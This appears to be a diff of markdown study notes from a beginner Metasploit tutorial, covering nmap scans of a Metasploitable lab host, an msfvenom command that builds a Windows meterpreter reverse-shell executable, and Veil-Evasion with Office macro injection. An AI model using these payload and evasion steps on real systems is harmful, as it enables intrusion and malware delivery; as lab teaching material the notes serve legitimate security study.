@@ -121,14 +121,18 @@ Hackersploit's Metasploit For Beginners - #1 - The Basics - Modules, Exploits & 
  
   ### Demonstration of using Metasploit<br />
   <br />
+  
   * use ZenMap to see software running and note network topography
   * db_nmap_status, db_nmap -T4 -A -v metasploitableIP
-  #### Creating Payloads
   
+  #### Creating Payloads
   
   * msfvenom -h
   * msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 lport=8080 lhost=LOCALHOST -f exe > /root/Desktop/payload.exe (not encoded)
   * Veil framework (veil-evasion) (payload with .bat extension, use Macroshop, inject in docx for Office macros)
+  * Meterpreter reverse shell
+  
+   #### msfconsole
   
   start postgresql before msfconsole<br />
   db_status<br />
